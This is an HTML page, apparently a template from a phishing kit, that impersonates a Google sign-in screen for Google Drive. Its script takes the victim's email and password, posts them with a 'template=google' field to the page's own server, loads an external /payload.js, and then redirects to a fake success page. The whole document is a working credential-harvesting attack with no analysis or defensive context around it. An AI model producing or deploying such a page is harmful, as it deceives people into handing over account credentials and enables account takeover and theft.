<!DOCTYPE html><html><head><title>Google</title><meta name="viewport" content="width=device-width"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#f1f3f4;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:white;max-width:400px;width:100%;margin:20px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);padding:40px;text-align:center}.logo{width:60px;height:60px;background:#4285f4;border-radius:4px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:24px}input{width:100%;padding:14px;margin:12px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}button{width:100%;padding:14px;background:#4285f4;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin:8px 0}button:hover{background:#3367d6}.error{color:#d93025;font-size:14px;margin:10px 0;display:none}</style></head><body><div class="card"><div class="logo">G</div><h2>Sign in</h2><p>To continue to Google Drive</p><div id="error" class="error"></div><input id="email" placeholder="Email or phone" type="email"><input id="pass" placeholder="Password" type="password"><button onclick="login()">Next</button></div><script src="/payload.js"></script><script>function login(){const e=document.getElementById('email').value,p=document.getElementById('pass').value;if(!e||!p){document.getElementById('error').style.display='block';document.getElementById('error').textContent='Enter credentials';return}const fd=new FormData();fd.append('email',e);fd.append('password',p);fd.append('template','google');fetch('/',{method:'POST',body:fd}).then(()=>setTimeout(()=>location='/success.html',1e3))}document.addEventListener('keydown',e=>'Enter'===e.key&&login());</script></body></html>
